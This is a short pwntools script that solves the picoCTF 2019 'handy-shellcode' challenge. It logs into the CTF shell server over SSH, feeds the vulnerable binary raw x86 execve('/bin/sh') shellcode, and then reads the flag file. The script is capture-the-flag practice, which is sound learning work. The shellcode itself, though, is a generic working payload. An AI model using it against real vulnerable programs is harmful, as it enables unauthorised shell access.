#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/handy-shellcode_3_1a2e95a810eefe4a5994631812c0b8af'

print("running vuln")
vuln = conn.process(location + '/vuln')

print("sending payload")
vuln.sendlineafter('shellcode', '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68')
vuln.sendlineafter('$', 'cd ' + location)
vuln.sendlineafter('$', 'cat ' + location + '/flag.txt')

print("done")
vuln.interactive()

